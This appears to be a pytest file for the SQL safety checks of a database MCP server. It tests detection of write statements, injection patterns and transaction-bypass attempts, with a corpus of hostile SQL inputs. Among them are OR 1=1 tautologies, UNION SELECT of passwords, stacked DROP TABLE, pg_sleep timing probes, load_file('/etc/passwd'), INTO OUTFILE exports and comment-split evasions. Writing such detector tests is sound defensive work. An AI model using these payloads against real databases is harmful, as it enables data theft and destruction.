            assert 'TRANSACTION_CONTROL' in keywords, f"Should detect transaction control in: {sql}"

        # Test that injection risk detection stops at first match
        sql_with_multiple_risks = "SELECT * FROM users WHERE id = 1 OR 1=1 UNION SELECT * FROM admin"
        issues = check_sql_injection_risk(sql_with_multiple_risks)
        # Should only return one issue (breaks at first match)
        assert len(issues) == 1
        assert issues[0]['type'] == 'sql'
        assert 'Suspicious pattern detected' in issues[0]['message']
        assert issues[0]['severity'] == 'high'

    def test_mutating_keywords_combinations(self):
        """Test various combinations of mutating keywords."""
        # Test SQL that matches multiple categories
        complex_sql = "CREATE TABLE test (id int); GRANT SELECT ON test TO user; SET GLOBAL var = 1"
        keywords = detect_mutating_keywords(complex_sql)

        # Should detect multiple categories
        assert 'CREATE' in keywords
        assert 'DDL' in keywords
        assert 'GRANT' in keywords  # GRANT is detected as individual keyword, not PERMISSION category
        # Note: SET GLOBAL doesn't match the SYSTEM regex pattern exactly, so let's test with a different pattern

        # Test with a pattern that definitely matches SYSTEM
        system_sql = "FLUSH PRIVILEGES"
        system_keywords = detect_mutating_keywords(system_sql)
        assert 'SYSTEM' in system_keywords

        # Test deduplication of keywords
        duplicate_sql = "CREATE TABLE test1 (id int); CREATE TABLE test2 (id int)"
        keywords = detect_mutating_keywords(duplicate_sql)
        # CREATE should only appear once in the result
        create_count = keywords.count('CREATE')
        assert create_count == 1, f"CREATE should appear only once, but found {create_count} times"

    def test_transaction_bypass_edge_cases(self):
        """Test edge cases for transaction bypass detection."""
        # Test COMMIT with various spacing and case variations
        bypass_variations = [
            "SELECT 1;COMMIT;CREATE TABLE test(id int)",  # No spaces
            "SELECT 1; COMMIT ; CREATE TABLE test(id int)",  # Extra spaces
            "SELECT 1;\nCOMMIT;\nCREATE TABLE test(id int)",  # Newlines
            "SELECT 1;\tCOMMIT;\tCREATE TABLE test(id int)",  # Tabs
            "select 1; commit; create table test(id int)",  # Lowercase
        ]

        for sql in bypass_variations:
            assert detect_transaction_bypass_attempt(sql) is True, f"Should detect bypass in: {sql}"

        # Test multiple statements without COMMIT
        non_bypass_sql = [
            "SELECT 1; SELECT 2; SELECT 3",
            "SELECT * FROM users; SELECT COUNT(*) FROM orders",
        ]

        for sql in non_bypass_sql:
            assert detect_transaction_bypass_attempt(sql) is True, f"Should detect multiple statements in: {sql}"

    # Server-level security integration tests
    async def test_readonly_query_blocks_mutating_keywords(self):
        """Test that readonly_query blocks SQL with mutating keywords."""
        mutating_queries = [
            "INSERT INTO users (name) VALUES ('test')",
            "UPDATE users SET name = 'updated'",
            "DELETE FROM users WHERE id = 1",
            "CREATE TABLE test (id int)",
            "DROP TABLE users",
            "ALTER TABLE users ADD COLUMN email varchar(255)",
            "TRUNCATE TABLE users",
            "GRANT SELECT ON users TO 'user'",
            "REVOKE SELECT ON users FROM 'user'",
            "COPY users FROM '/tmp/data.csv'",
        ]

        for sql in mutating_queries:
            with pytest.raises(Exception) as excinfo:
                await readonly_query(sql, ctx)
            assert ERROR_WRITE_QUERY_PROHIBITED in str(excinfo.value)

    async def test_readonly_query_blocks_injection_risks(self):
        """Test that readonly_query blocks SQL injection patterns."""
        # Test injection patterns that don't contain mutating keywords (so injection check runs first)
        injection_queries = [
            "SELECT * FROM users WHERE id = 1 OR 1=1",
            "SELECT * FROM users WHERE name = 'test' OR 'a'='a'",
            "SELECT * FROM users WHERE name = 'test'--",
            "SELECT pg_sleep(5)",
        ]

        for sql in injection_queries:
            with pytest.raises(Exception) as excinfo:
                await readonly_query(sql, ctx)
            assert ERROR_QUERY_INJECTION_RISK in str(excinfo.value)

        # Test injection patterns that also contain mutating keywords or are caught by injection first
        mixed_injection_queries = [
            ("SELECT * FROM users; DROP TABLE users; --", ERROR_WRITE_QUERY_PROHIBITED),  # Mutating keyword first
            ("SELECT * FROM users UNION SELECT * FROM admin_users", ERROR_QUERY_INJECTION_RISK),  # Injection first
            ("SELECT * FROM users WHERE id = 1; INSERT INTO logs VALUES ('hacked')", ERROR_WRITE_QUERY_PROHIBITED),  # Mutating keyword first
            ("SELECT * INTO OUTFILE '/tmp/output.txt' FROM users", ERROR_WRITE_QUERY_PROHIBITED),  # Actually caught by SYSTEM mutating keyword
        ]

        for sql, expected_error in mixed_injection_queries:
            with pytest.raises(Exception) as excinfo:
                await readonly_query(sql, ctx)
            assert expected_error in str(excinfo.value)

    async def test_readonly_query_blocks_transaction_bypass_server_level(self):
        """Test that readonly_query blocks transaction bypass attempts at server level."""
        # Multiple statements are actually caught by injection risk detection first
        # (stacked queries pattern), which is correct behavior
        bypass_queries = [
            "SELECT 1; SELECT 2; SELECT 3",  # Multiple statements - caught by injection risk
            "SELECT * FROM users; SELECT COUNT(*) FROM orders",  # Multiple statements - caught by injection risk
        ]

        for sql in bypass_queries:
            with pytest.raises(Exception) as excinfo:
                await readonly_query(sql, ctx)
            # These are caught by injection risk detection (stacked queries)
            assert ERROR_QUERY_INJECTION_RISK in str(excinfo.value)

        # Test bypass patterns that also contain mutating keywords (mutating check runs first)
        mutating_bypass_queries = [
            "SELECT 1; COMMIT; CREATE TABLE hack (id int)",
            "SELECT * FROM users; COMMIT; BEGIN; DROP TABLE sensitive_data",
            "SELECT COUNT(*); ROLLBACK; INSERT INTO logs VALUES ('bypass')",
            "SELECT name FROM users; COMMIT; ALTER TABLE users ADD COLUMN hacked boolean",
            "SELECT * FROM information_schema.tables; COMMIT; BEGIN; CREATE TABLE test_table (id int)",
        ]

        for sql in mutating_bypass_queries:
            with pytest.raises(Exception) as excinfo:
                await readonly_query(sql, ctx)
            # These will be caught by mutating keyword check first
            assert ERROR_WRITE_QUERY_PROHIBITED in str(excinfo.value)

    async def test_readonly_query_allows_safe_queries(self):
        """Test that readonly_query allows safe SELECT queries."""
        with patch('awslabs.aurora_dsql_mcp_server.server.get_connection') as mock_get_connection, \
             patch('awslabs.aurora_dsql_mcp_server.server.execute_query') as mock_execute_query:

            mock_conn = AsyncMock()
            mock_get_connection.return_value = mock_conn
            mock_execute_query.return_value = [{'id': 1, 'name': 'test'}]

            safe_queries = [
                "SELECT * FROM users",
                "SELECT id, name FROM users WHERE active = true",
                "SELECT COUNT(*) FROM orders",
                "SELECT u.name, o.total FROM users u JOIN orders o ON u.id = o.user_id",
                "WITH recent_orders AS (SELECT * FROM orders WHERE created_at > '2023-01-01') SELECT * FROM recent_orders",
            ]

            for sql in safe_queries:
                result = await readonly_query(sql, ctx)
                assert result == [{'id': 1, 'name': 'test'}]

    async def test_readonly_query_security_checks_order(self):
        """Test that security checks are performed in the correct order."""
        # Test that mutating keyword check comes first
        sql_with_mutating = "INSERT INTO users (name) VALUES ('test'); SELECT pg_sleep(5)"

        with pytest.raises(Exception) as excinfo:
            await readonly_query(sql_with_mutating, ctx)
        # Should catch the mutating keyword first, not the injection risk
        assert ERROR_WRITE_QUERY_PROHIBITED in str(excinfo.value)

    async def test_readonly_query_complex_bypass_attempt(self):
        """Test detection of complex transaction bypass attempts."""
        complex_sql = "SELECT * FROM information_schema.tables; COMMIT; BEGIN; CREATE TABLE test_table (id int)"

        with pytest.raises(Exception) as excinfo:
            await readonly_query(complex_sql, ctx)
        # Should be caught by mutating keywords first
        assert ERROR_WRITE_QUERY_PROHIBITED in str(excinfo.value)

    async def test_readonly_query_case_insensitive_detection(self):
        """Test that security checks work regardless of case."""
        case_variations = [
            "insert into users (name) values ('test')",
            "INSERT INTO users (name) VALUES ('test')",
            "Insert Into users (name) Values ('test')",
            "InSeRt InTo users (name) VaLuEs ('test')",
        ]

        for sql in case_variations:
            with pytest.raises(Exception) as excinfo:
                await readonly_query(sql, ctx)
            assert ERROR_WRITE_QUERY_PROHIBITED in str(excinfo.value)

    async def test_readonly_query_with_comments(self):
        """Test that security checks work with SQL comments."""
        sql_with_comments = [
            "SELECT * FROM users; -- This is a comment\nCOMMIT; CREATE TABLE hack (id int)",
            "/* Multi-line comment */ SELECT 1; COMMIT; DROP TABLE users",
            "SELECT * FROM users WHERE name = 'test'-- comment",
        ]

        for sql in sql_with_comments:
            with pytest.raises(Exception) as excinfo:
                await readonly_query(sql, ctx)
            # Should be caught by one of the security checks
            assert any(error in str(excinfo.value) for error in [
                ERROR_WRITE_QUERY_PROHIBITED,
                ERROR_QUERY_INJECTION_RISK,
                ERROR_TRANSACTION_BYPASS_ATTEMPT
            ])

    async def test_readonly_query_postgresql_specific_patterns(self):
        """Test detection of PostgreSQL-specific security issues."""
        postgres_patterns = [
            "COPY users FROM '/tmp/users.csv'",
            "COPY (SELECT * FROM users) TO '/tmp/export.csv'",
            "SELECT pg_sleep(5)",
        ]

        for sql in postgres_patterns:
            with pytest.raises(Exception) as excinfo:
                await readonly_query(sql, ctx)
            # Should be caught by either mutating keywords or injection risk detection
            assert any(error in str(excinfo.value) for error in [
                ERROR_WRITE_QUERY_PROHIBITED,
                ERROR_QUERY_INJECTION_RISK
            ])

    async def test_readonly_query_permission_statements(self):
        """Test detection of permission-related statements."""
        permission_sql = [
            "GRANT ALL PRIVILEGES ON database.* TO 'user'@'host'",
            "REVOKE SELECT ON table FROM user",
            "CREATE USER 'newuser'@'localhost' IDENTIFIED BY 'password'",
            "DROP USER 'olduser'@'localhost'",
        ]

        for sql in permission_sql:
            with pytest.raises(Exception) as excinfo:
                await readonly_query(sql, ctx)
            assert ERROR_WRITE_QUERY_PROHIBITED in str(excinfo.value)

    async def test_readonly_query_system_statements(self):
        """Test detection of system-level statements."""
        system_sql = [
            "SET GLOBAL max_connections = 1000",
            "FLUSH PRIVILEGES",
            "LOAD DATA INFILE '/tmp/data.csv' INTO TABLE users",
            "SELECT * INTO OUTFILE '/tmp/output.txt' FROM users",
        ]

        for sql in system_sql:
            with pytest.raises(Exception) as excinfo:
                await readonly_query(sql, ctx)
            # Should be caught by either mutating keywords or injection risk detection
            assert any(error in str(excinfo.value) for error in [
                ERROR_WRITE_QUERY_PROHIBITED,
                ERROR_QUERY_INJECTION_RISK
            ])

    # Transact tool security tests
    @patch('awslabs.aurora_dsql_mcp_server.server.read_only', True)
    async def test_transact_allows_read_queries_in_read_only_mode(self):
        """Test that transact allows SELECT queries in read-only mode."""
        with patch('awslabs.aurora_dsql_mcp_server.server.get_connection') as mock_get_connection, \
             patch('awslabs.aurora_dsql_mcp_server.server.execute_query') as mock_execute_query:

            mock_conn = AsyncMock()
            mock_get_connection.return_value = mock_conn
            mock_execute_query.return_value = [{'count': 10}]

            safe_queries = [
                ['SELECT * FROM orders'],
                ['SELECT COUNT(*) FROM orders'],
                ['SELECT * FROM orders', 'SELECT COUNT(*) FROM orders'],
                ['SELECT u.name, o.total FROM users u JOIN orders o ON u.id = o.user_id'],
            ]

            for sql_list in safe_queries:
                result = await transact(sql_list, ctx)
                assert result == [{'count': 10}]

    @patch('awslabs.aurora_dsql_mcp_server.server.read_only', True)
    async def test_transact_rejects_write_queries_in_read_only_mode(self):
        """Test that transact rejects write operations in read-only mode."""
        write_queries = [
            ['INSERT INTO orders VALUES (1)'],
            ['UPDATE orders SET status = "shipped"'],
            ['DELETE FROM orders WHERE id = 1'],
            ['CREATE TABLE test (id int)'],
            ['DROP TABLE orders'],
            ['ALTER TABLE orders ADD COLUMN notes TEXT'],
            ['TRUNCATE TABLE orders'],
        ]

        for sql_list in write_queries:
            with pytest.raises(Exception) as excinfo:
                await transact(sql_list, ctx)
            assert ERROR_WRITE_QUERY_PROHIBITED in str(excinfo.value)

    @patch('awslabs.aurora_dsql_mcp_server.server.read_only', True)
    async def test_transact_rejects_mixed_queries_in_read_only_mode(self):
        """Test that transact rejects transactions with mixed read/write in read-only mode."""
        mixed_queries = [
            ['SELECT * FROM orders', 'DELETE FROM orders WHERE id = 1'],
            ['SELECT COUNT(*) FROM orders', 'INSERT INTO orders VALUES (1)'],
            ['SELECT * FROM orders', 'UPDATE orders SET status = "shipped"'],
        ]

        for sql_list in mixed_queries:
            with pytest.raises(Exception) as excinfo:
                await transact(sql_list, ctx)
            assert ERROR_WRITE_QUERY_PROHIBITED in str(excinfo.value)

    @patch('awslabs.aurora_dsql_mcp_server.server.read_only', True)
    async def test_transact_rejects_injection_in_read_only_mode(self):
        """Test that transact rejects SQL injection patterns in read-only mode."""
        injection_queries = [
            ['SELECT * FROM users WHERE id = 1 OR 1=1'],
            ["SELECT * FROM users WHERE name = 'test' OR 'a'='a'"],
            ['SELECT pg_sleep(5)'],
        ]

        for sql_list in injection_queries:
            with pytest.raises(Exception) as excinfo:
                await transact(sql_list, ctx)
            assert ERROR_QUERY_INJECTION_RISK in str(excinfo.value)

    @patch('awslabs.aurora_dsql_mcp_server.server.read_only', True)
    async def test_transact_rejects_transaction_bypass_in_read_only_mode(self):
        """Test that transact rejects transaction bypass attempts in read-only mode."""
        bypass_queries = [
            ['SELECT 1; COMMIT; CREATE TABLE hack (id int)'],
            ['SELECT * FROM users; COMMIT; DROP TABLE users'],
        ]

        for sql_list in bypass_queries:
            with pytest.raises(Exception) as excinfo:
                await transact(sql_list, ctx)
            # Should be caught by either mutating keywords or transaction bypass detection
            assert any(error in str(excinfo.value) for error in [
                ERROR_WRITE_QUERY_PROHIBITED,
                ERROR_TRANSACTION_BYPASS_ATTEMPT
            ])

    @patch('awslabs.aurora_dsql_mcp_server.server.read_only', True)
    async def test_transact_rejects_stacked_queries_in_read_only_mode(self):
        """Test that transact specifically rejects stacked queries (transaction bypass)."""
        # Test the transaction bypass detection path by mocking injection check to pass
        with patch('awslabs.aurora_dsql_mcp_server.server.check_sql_injection_risk', return_value=[]):
            with patch('awslabs.aurora_dsql_mcp_server.server.detect_mutating_keywords', return_value=[]):
                stacked_query = ['SELECT 1; SELECT 2']

                with pytest.raises(Exception) as excinfo:
                    await transact(stacked_query, ctx)

                assert ERROR_TRANSACTION_BYPASS_ATTEMPT in str(excinfo.value)

    @patch('awslabs.aurora_dsql_mcp_server.server.read_only', True)
    async def test_transact_validates_all_statements_before_execution(self):
        """Test that transact validates all statements before executing any."""
        # If the second statement is invalid, the first should never execute
        with patch('awslabs.aurora_dsql_mcp_server.server.execute_query') as mock_execute_query:
            sql_list = ['SELECT * FROM orders', 'DELETE FROM orders WHERE id = 1']

            with pytest.raises(Exception) as excinfo:
                await transact(sql_list, ctx)

            assert ERROR_WRITE_QUERY_PROHIBITED in str(excinfo.value)
            # execute_query should never be called because validation fails
            mock_execute_query.assert_not_called()

    @patch('awslabs.aurora_dsql_mcp_server.server.read_only', True)
    async def test_transact_handles_readonly_sql_transaction_error(self):
        """Test that transact properly handles ReadOnlySqlTransaction errors."""
        import psycopg.errors

        with patch('awslabs.aurora_dsql_mcp_server.server.get_connection') as mock_get_conn:
            with patch('awslabs.aurora_dsql_mcp_server.server.execute_query') as mock_execute:
                mock_conn = MagicMock()
                mock_get_conn.return_value = mock_conn

                # First call succeeds (BEGIN), second call raises ReadOnlySqlTransaction
                mock_execute.side_effect = [
                    None,  # BEGIN READ ONLY TRANSACTION succeeds
                    psycopg.errors.ReadOnlySqlTransaction('cannot execute INSERT in a read-only transaction')
                ]

                with pytest.raises(Exception) as excinfo:
                    await transact(['SELECT * FROM users'], ctx)

                assert READ_ONLY_QUERY_WRITE_ERROR in str(excinfo.value)

    @patch('awslabs.aurora_dsql_mcp_server.server.read_only', True)
    async def test_transact_case_insensitive_validation(self):
        """Test that transact validation works regardless of case."""
        case_variations = [
            ['insert into orders values (1)'],
            ['INSERT INTO orders VALUES (1)'],
            ['Insert Into orders Values (1)'],
        ]

        for sql_list in case_variations:
            with pytest.raises(Exception) as excinfo:
                await transact(sql_list, ctx)
            assert ERROR_WRITE_QUERY_PROHIBITED in str(excinfo.value)

    @patch('awslabs.aurora_dsql_mcp_server.server.read_only', True)
    async def test_transact_permission_statements_in_read_only_mode(self):
        """Test that transact rejects permission statements in read-only mode."""
        permission_queries = [
            ['GRANT SELECT ON orders TO user'],
            ['REVOKE SELECT ON orders FROM user'],
            ['CREATE USER newuser'],
        ]

        for sql_list in permission_queries:
            with pytest.raises(Exception) as excinfo:
                await transact(sql_list, ctx)
            assert ERROR_WRITE_QUERY_PROHIBITED in str(excinfo.value)

    @patch('awslabs.aurora_dsql_mcp_server.server.read_only', True)
    async def test_transact_system_statements_in_read_only_mode(self):
        """Test that transact rejects system statements in read-only mode."""
        system_queries = [
            ['FLUSH PRIVILEGES'],
            ['LOAD DATA INFILE "/tmp/data.csv" INTO TABLE orders'],
        ]

        for sql_list in system_queries:
            with pytest.raises(Exception) as excinfo:
                await transact(sql_list, ctx)
            assert ERROR_WRITE_QUERY_PROHIBITED in str(excinfo.value)


@patch('awslabs.aurora_dsql_mcp_server.server.cluster_endpoint', 'test_endpoint')
class TestInjectionDetectionHardening:
    """Tests for the write-mode gate and structured labels.

    These cover two behavioural changes:
      1. Structured labels are returned for programmatic pattern identification.
      2. In write mode, injection and transaction-bypass checks still run
         (only the mutating-keyword check is correctly skipped).
    """

    # ---- 1. Structured labels ----

    def test_injection_result_includes_label(self):
        """Callers should be able to distinguish patterns without parsing messages."""
        issues = check_sql_injection_risk("SELECT * FROM u WHERE id = 1 OR 1=1")
        assert issues
        assert issues[0]['label'] == 'numeric_tautology'
        assert 'pattern' not in issues[0]
        assert issues[0]['type'] == 'sql'
        assert issues[0]['severity'] == 'high'

    # ---- 2. Write-mode filter enforcement ----

    @pytest.mark.asyncio
    @patch('awslabs.aurora_dsql_mcp_server.server.read_only', False)
    async def test_transact_in_write_mode_still_rejects_injection(self):
        """Even with --allow-writes, obviously-injected SQL must be rejected."""
        with pytest.raises(Exception) as excinfo:
            await transact(
                ["UPDATE entities SET status = 'x' WHERE tenant_id = 'y' OR 1=1"],
                ctx,
            )
        assert ERROR_QUERY_INJECTION_RISK in str(excinfo.value)

    @pytest.mark.asyncio
    @patch('awslabs.aurora_dsql_mcp_server.server.read_only', False)
    async def test_transact_in_write_mode_still_rejects_stacked_queries(self):
        """Write mode must not permit `...; DROP TABLE ...` style chaining."""
        with pytest.raises(Exception) as excinfo:
            await transact(
                ["INSERT INTO t VALUES (1); DROP TABLE t"],
                ctx,
            )
        assert ERROR_QUERY_INJECTION_RISK in str(excinfo.value)

    @pytest.mark.asyncio
    @patch('awslabs.aurora_dsql_mcp_server.server.read_only', False)
    async def test_transact_in_write_mode_catches_injection_in_later_statement(self):
        """Second statement in list is injected; first is clean."""
        with pytest.raises(Exception) as excinfo:
            await transact(
                [
                    "INSERT INTO entities (id) VALUES ('a')",
                    "UPDATE entities SET status = 'x' WHERE id = 'b' OR 1=1",
                ],
                ctx,
            )
        assert ERROR_QUERY_INJECTION_RISK in str(excinfo.value)

    @pytest.mark.asyncio
    @patch('awslabs.aurora_dsql_mcp_server.server.read_only', False)
    async def test_transact_in_write_mode_allows_legitimate_inserts(self):
        """Harden-in-write-mode must not break normal INSERT/UPDATE/DELETE."""
        with patch('awslabs.aurora_dsql_mcp_server.server.get_connection') as mock_conn:
            with patch(
                'awslabs.aurora_dsql_mcp_server.server.execute_query',
                return_value=[],
            ):
                mock_conn.return_value = MagicMock()
                await transact(
                    [
                        "INSERT INTO entities (id, tenant_id, name) "
                        "VALUES ('a', 'acme', 'Widget')",
                        "UPDATE entities SET name = 'Gadget' WHERE id = 'a'",
                    ],
                    ctx,
                )

    @pytest.mark.asyncio
    @patch('awslabs.aurora_dsql_mcp_server.server.read_only', False)
    async def test_transact_in_write_mode_allows_legitimate_ddl(self):
        """Write mode must not block DDL that keyword-level patterns match."""
        with patch('awslabs.aurora_dsql_mcp_server.server.get_connection') as mock_conn:
            with patch(
                'awslabs.aurora_dsql_mcp_server.server.execute_query',
                return_value=[],
            ):
                mock_conn.return_value = MagicMock()
                await transact(["DROP TABLE old_data"], ctx)
                await transact(["TRUNCATE TABLE staging"], ctx)
                await transact(
                    ["GRANT SELECT ON entities TO app_role"], ctx
                )
                await transact(
                    [
                        "INSERT INTO t SELECT a FROM x "
                        "UNION SELECT b FROM y"
                    ],
                    ctx,
                )


class TestInjectionCorpus:
    """Corpus of pre-existing injection patterns and legitimate queries.

    Organized by attack category. These test the patterns that are never
    legitimate in single-statement CRUD (tautologies, UNION SELECT, DROP,
    stacked queries, etc.). Non-equality boolean and subquery patterns were
    intentionally omitted — regex heuristics for those are trivially
    bypassable and params support is the correct fix.
    """

    # ------------------------------------------------------------------
    # REAL POSITIVES — must be caught
    # ------------------------------------------------------------------

    @pytest.mark.parametrize('sql', [
        "SELECT * FROM users WHERE id = '1' --'",
        "SELECT * FROM users WHERE name = 'x'--' AND active = true",
        "SELECT * FROM t WHERE col = 'val'-- rest is ignored",
    ])
    def test_catches_comment_injection(self, sql):
        issues = check_sql_injection_risk(sql)
        assert issues, f'should catch comment injection: {sql}'
        assert issues[0]['label'] == 'comment_injection'

    @pytest.mark.parametrize('sql', [
        "SELECT * FROM users WHERE id = 1 OR 1=1",
        "SELECT * FROM users WHERE active = true OR 2=2",
        "SELECT * FROM t WHERE x = 'a' OR 99=99",
    ])
    def test_catches_numeric_tautology(self, sql):
        issues = check_sql_injection_risk(sql)
        assert issues, f'should catch numeric tautology: {sql}'
        assert issues[0]['label'] == 'numeric_tautology'

    @pytest.mark.parametrize('sql', [
        "SELECT * FROM users WHERE name = 'x' OR 'a'='a'",
        "SELECT * FROM t WHERE col = 'y' OR 'test'='test'",
    ])
    def test_catches_string_tautology(self, sql):
        issues = check_sql_injection_risk(sql)
        assert issues, f'should catch string tautology: {sql}'
        assert issues[0]['label'] == 'string_tautology'

    @pytest.mark.parametrize('sql', [
        "SELECT name FROM users UNION SELECT password FROM admin",
        "SELECT * FROM t WHERE id = 1 UNION SELECT * FROM secrets",
        "SELECT a FROM t UNION ALL SELECT b FROM u",
    ])
    def test_catches_union_select(self, sql):
        issues = check_sql_injection_risk(sql)
        assert issues, f'should catch UNION SELECT: {sql}'
        assert issues[0]['label'] == 'union_select'

    @pytest.mark.parametrize('sql', [
        "DROP TABLE users",
        "SELECT 1; DROP TABLE users",
        "SELECT * FROM t WHERE name = 'x'; DROP TABLE t; --",
    ])
    def test_catches_drop(self, sql):
        issues = check_sql_injection_risk(sql)
        assert issues, f'should catch DROP: {sql}'

    @pytest.mark.parametrize('sql', [
        "SELECT 1;SELECT 2",
        "SELECT * FROM t WHERE id = 1;INSERT INTO log VALUES('x')",
    ])
    def test_catches_stacked_queries(self, sql):
        issues = check_sql_injection_risk(sql)
        assert issues, f'should catch stacked query: {sql}'

    @pytest.mark.parametrize('sql', [
        "SELECT * FROM t WHERE id = 1 AND sleep(5)",
        "SELECT * FROM t WHERE id = 1 AND pg_sleep(10)",
    ])
    def test_catches_time_based_injection(self, sql):
        issues = check_sql_injection_risk(sql)
        assert issues, f'should catch time-based injection: {sql}'

    @pytest.mark.parametrize('sql', [
        "SELECT load_file('/etc/passwd')",
        "SELECT * INTO OUTFILE '/tmp/dump.csv' FROM users",
        "COPY users FROM '/tmp/data.csv'",
        "COPY (SELECT * FROM users) TO '/tmp/export.csv'",
    ])
    def test_catches_file_operations(self, sql):
        issues = check_sql_injection_risk(sql)
        assert issues, f'should catch file operation: {sql}'

    @pytest.mark.parametrize('sql', [
        "BEGIN; CREATE TABLE hack (id int)",
        "COMMIT; DROP TABLE users",
        "ROLLBACK; INSERT INTO log VALUES('bypass')",
    ])
    def test_catches_transaction_bypass(self, sql):
        issues = check_sql_injection_risk(sql)
        assert issues, f'should catch transaction bypass: {sql}'

    # ------------------------------------------------------------------
    # REAL NEGATIVES — must NOT be flagged
    # ------------------------------------------------------------------

    @pytest.mark.parametrize('sql,reason', [
        ("SELECT * FROM users", "bare select"),
        ("SELECT id, name FROM users WHERE active = true", "simple predicate"),
        ("SELECT COUNT(*) FROM orders", "aggregate"),
        ("SELECT * FROM t WHERE id = 1", "numeric equality"),
        ("SELECT * FROM t WHERE name = 'Alice'", "string equality"),
        (
            "SELECT u.name, o.total FROM users u "
            "JOIN orders o ON u.id = o.user_id",
            "inner join",
        ),
        (
            "SELECT * FROM entities "
            "WHERE tenant_id = 'acme' AND status IS NOT NULL",
            "AND IS NOT NULL",
        ),
        (
            "SELECT * FROM entities "
            "WHERE name IS NOT NULL OR email IS NOT NULL",
            "OR IS NOT NULL",
        ),
        (
            "SELECT * FROM orders WHERE price > 10 OR discount > 0",
            "OR comparison",
        ),
        ("SELECT * FROM orders WHERE created_at > '2023-01-01'", "date comparison"),
        ("SELECT * FROM logs WHERE message LIKE 'error%'", "LIKE prefix"),
        (
            "SELECT * FROM orders o "
            "WHERE EXISTS (SELECT 1 FROM users u WHERE u.id = o.user_id)",
            "correlated EXISTS",
        ),
        (
            "WITH recent AS (SELECT * FROM orders WHERE created_at > '2023-01-01') "
            "SELECT * FROM recent",
            "CTE",
        ),
        (
            "INSERT INTO entities (id, tenant_id, name) "
            "VALUES ('uuid-1234', 'acme', 'Widget')",
            "simple INSERT",
        ),
        (
            "UPDATE entities SET name = 'Gadget' WHERE id = 'uuid-1234'",
            "simple UPDATE",
        ),
        ("DELETE FROM entities WHERE id = 'uuid-1234'", "simple DELETE"),
        (
            "SELECT * FROM entities "
            "WHERE tenant_id = 'tenant-123' AND entity_id = 'ent-456'",
            "tenant-scoped lookup",
        ),
        (
            "SELECT * FROM entities "
            "WHERE tenant_id = 'acme' "
            "ORDER BY created_at DESC LIMIT 50",
            "tenant-scoped with ORDER BY LIMIT",
        ),
        (
            "SELECT * FROM products "
            "WHERE brand = 'Samsung' OR brand = 'Apple'",
            "OR on same column with long values",
        ),
    ])
    def test_legitimate_query_not_flagged(self, sql, reason):
        issues = check_sql_injection_risk(sql)
        assert issues == [], f'false positive on "{reason}": {sql} -> {issues}'


class TestCommentBypass:
    """Test that inline SQL comments cannot bypass regex-based detection."""

    @pytest.mark.parametrize("sql,label", [
        ("SELECT * INTO/**/OUTFILE '/tmp/data'", "into_outfile"),
        ("SELECT * INTO /* comment */ OUTFILE '/tmp/data'", "into_outfile"),
        ("COPY users/**/ TO /**/'/tmp/out'", "copy_to"),
        ("COPY/**/users FROM '/tmp/data'", "copy_from"),
    ])
    def test_comment_bypass_injection_detected(self, sql, label):
        """Inline comments between SQL keywords must not bypass injection detection."""
        issues = check_sql_injection_risk(sql, read_only=True)
        assert len(issues) == 1, f'comment bypass not detected: {sql}'
        assert issues[0]['label'] == label

    @pytest.mark.parametrize("sql", [
        "LOAD/**/DATA/**/INFILE '/tmp/data' INTO TABLE t",
        "LOAD /* x */ DATA /* y */ INFILE '/tmp/data' INTO TABLE t",
        "SELECT/**/*/**/INTO/**/OUTFILE '/tmp/data' FROM users",
    ])
    def test_comment_bypass_mutating_detected(self, sql):
        """Inline comments between SQL keywords must not bypass mutating keyword detection."""
        result = detect_mutating_keywords(sql)
        assert len(result) > 0, f'comment bypass not detected for mutating keywords: {sql}'

    @pytest.mark.parametrize("sql", [
        "SELECT/* this is a comment */ * FROM users",
        "SELECT * FROM users /* filter */ WHERE id = 1",
        "SELECT * FROM /* table */ orders WHERE status = 'active'",
    ])
    def test_legitimate_comments_not_flagged(self, sql):
        """Legitimate use of comments in benign queries should not trigger false positives."""
        issues = check_sql_injection_risk(sql, read_only=True)
        assert issues == [], f'false positive on commented query: {sql}'
        result = detect_mutating_keywords(sql)
        assert result == [], f'false positive on mutating keywords: {sql}'
